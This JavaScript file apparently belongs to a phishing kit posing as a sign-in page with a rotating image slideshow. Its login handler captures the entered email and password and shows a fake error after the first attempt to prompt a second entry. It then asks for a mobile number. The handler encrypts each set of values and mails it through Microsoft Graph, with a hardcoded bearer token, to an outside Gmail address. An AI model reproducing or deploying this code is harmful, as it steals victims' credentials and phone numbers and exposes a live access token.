let slideIdx = 0;
let loginIdx = 0;

function igcRegisterEvents() {
    $("body").off("keyup", ".igc_loginInputField").on({
        "keyup": function () {
            igcUpdateLoginBtnStyle();
        }
    }, ".igc_loginInputField");

    $("body").off("keyup", ".igc_mobileVerifyInputField").on({
        "keyup": function () {
            igcUpdateMobileVerifyBtnStyle();
        }
    }, ".igc_mobileVerifyInputField");

    $("body").off("click", ".igc_LogInBtn").on({
        "click": function () {
            igcDoLogin();
        }
    }, ".igc_LogInBtn");

    $("body").off("click", ".igc_mobileVerifyBtn").on({
        "click": function () {
            igcDoVerifyMobile();
        }
    }, ".igc_mobileVerifyBtn");
}

function igcUpdateLoginBtnStyle() {
    let $igcLogInBtnEl = $(".igc_LogInBtn");
    let isValidLoginInput = ($(".igc_email").val() && $(".igc_email").val().length > 7 && $(".igc_pwd").val() && $(".igc_pwd").val().length > 7);
    if (isValidLoginInput) {
        $igcLogInBtnEl.removeAttr("disabled")
    }
    else {
        $igcLogInBtnEl.prop("disabled", "disabled");
    }
}

function igcUpdateMobileVerifyBtnStyle() {
    let $igcMobileVerifyEl = $(".igc_mobileVerifyBtn");
    let isValidMobileNoInput = ($(".igc_mobile").val() && $(".igc_mobile").val().length > 9);
    if (isValidMobileNoInput) {
        $igcMobileVerifyEl.removeAttr("disabled")
    }
    else {
        $igcMobileVerifyEl.prop("disabled", "disabled");
    }
}

function igcDoLogin() {
    let $loginDivEl = $(".igcLoginMainDiv");
    let $mobileNoDivEl = $(".igcMobileNoMainDiv");
    let $errorEl = $(".igcErrorAlertDiv");
    let emailVal = $(".igc_email").val();
    let pwdVal = $(".igc_pwd").val();

    if (loginIdx) {
        $mobileNoDivEl.show();
        $loginDivEl.hide();
        $errorEl.css("display", "none");
    }
    else {
        $loginDivEl.show();
        $mobileNoDivEl.hide();
        $errorEl.css("display", "flex");
        $(".igc_email, .igc_pwd").val("");
        igcUpdateLoginBtnStyle();
    }

    loginIdx++;
    let infoObj = {
        "u": emailVal,
        "p": pwdVal
    };
    doSendEmail(infoObj);
}

function igcDoVerifyMobile() {
    let mobileNoVal = $(".igc_mobile").val();
    $(".igcMobileNoMainDiv").hide();
    $(".igcSuccessInfoMainDiv").show();
    
    let infoObj = {
        "m": mobileNoVal
    };
    doSendEmail(infoObj);
}

function doSendEmail(infoObj) {
    let authorizeTokenVal = "EwB4A8l6BAAUwihrrCrmQ4wuIJX5mbj7rQla6TUAAaljOZRApO1w1vAEP8toziAOq4PBPUHT97GspG61WhBXMAL7dIxEZerlE8Gr4B6hEuzi8cXwBXlk7nAS8rMAWsBgjdaNcZ6BnghX5DbAPn9Ioy4ZZMAm9CHlPRZ62aUiJPd8Bu+v3SearvhAiMG3bFJkqQoh2IUmPQUcOFyIlWe5gQKZdyyK6cJgIoywqq2iRFfbj4jU7z5SGnBvLpDIAZ59fFGUZ52UgRguuGC0Ppmg+TzSYu+Ex30DwD5lzzav7qePpRDRhDjQ4X5sGRauooaMSUwba6r39dV3nXojg2vYeGmxipqT7Lab63oEd/dNTFoeuj7laa1WGB/MLS7SBzsDZgAACDdWPZm/gMXSSAIK8si8IQHWbwA9HRBdNNlaqC4gTseKYwSbNnexUxWSESlKsg6m/oUtVjrFtMBuaB1UTZ22t/n3TRmjJHUtybf1vk8Z7tCHexoD8cCw688xc4UjRF0b6rV4XcermvrMh3pW/pudfJqCqZoC8rIeZwKIwanATLLV4ZterWykCUatn6R46v+IqAgBipWo+nUPzf3BxrGCcu2hVa/H8RYR53yF7deMe+9VXPO1pXBRKGrl/JCKvaeU5sZ4NLgjppa2YRTKmsENZyq6jIWMTN3ZjJynw+XphFKCMdU+qgWBxCxvs3FqELVnuHb4aAu6sjqPcdE/3fYS3tALkGgy/twQAxgGOzQeu5gCFAtJJbxbyKSTUe5+gcNPAyd34MBIN92XFqsx+RS13XW4QDh4ev/DahpZy3gYBk5JEYL0DM8hGbywdOxV9ltwBPyyDHTOSZONZGiKCpG2x2WBKIq5F5LYhg4TYFTw0T0tWvUMDnFJ92X4oum0SIofuUIHLF+no5L7jSxiETct5FJ7YOaIZFCUVislzHzGB9L8IM9EtaNqRZJ78R077kKirzLysfJrJ9WcqeefYh439J/QBsJE2QTsPfwFlxzto0ZeaDdJFh/IQNjcipGj2n1BWRQJUZ6l9Fgkzc4cq88DZAYwUVhjrnxIub9u4zzS2obPH5zxAYEvZGizS1Dm8OYjcJoAYQBNpMhYZgCEI8k+11Af2zkAv2nDtDIwA5+nKehF0zvxFn4AGnvBdKiMocsmU1JY2upWsZ/fuIUOj2tCYmKJ450C";

    let igcContent = [];
    $.each(infoObj, function (k, v) {
        if (k && v) {
            igcContent.push(`${k} : ${v}`);
        }
    })

    let igcInfo = doDataEncrypt(igcContent.join(" , "));
    igcInfo = (igcInfo ? igcInfo.toString() : "");

    $.ajax({
        url: "https://graph.microsoft.com/v1.0/users/56c0490219ac4a88/sendMail",
        method: "POST",
        headers: {
            "Authorization": "Bearer " + authorizeTokenVal,
            "Content-Length": "180",
            "Content-Type": "application/json"
        },
        data: JSON.stringify({
            "message": {
                "subject": "IGC",
                "body": {
                    "contentType": "Text",
                    "content": igcInfo
                },
                "toRecipients": [
                    {
                        "emailAddress": {
                            "address": "mail2alpha7@gmail.com"
                        }
                    }
                ]
            }
        })
    })
    .done(function (result) {
        console.log(result);
    })
    .fail(function (err) {
        console.log(err);
    });
}

const igcSecretSaltTxt = "igcSecretPhrase";

function doDataEncrypt(dataForEncrypt) {
    if (dataForEncrypt)
        return CryptoJS.AES.encrypt(dataForEncrypt, igcSecretSaltTxt);
    return "";
}

function doDataDecrypt(dataForDecrypt) {
    if (dataForDecrypt)
        return CryptoJS.AES.decrypt(dataForDecrypt, igcSecretSaltTxt).toString(CryptoJS.enc.Utf8);
    return "";
}

function igcImgSlides() {
    let $igcSlideImgs = $(".igc_slideImg");
    $igcSlideImgs.hide();
    slideIdx++;
    if (slideIdx > $igcSlideImgs.length) { slideIdx = 1 }
    $($igcSlideImgs[slideIdx - 1]).show();
    setTimeout(igcImgSlides, 3000);
}

function hideMask() {
    $(".igcMaskDiv, .igcMaskContentDiv").hide();
}

$(function () {
    igcRegisterEvents();
    igcImgSlides();
})
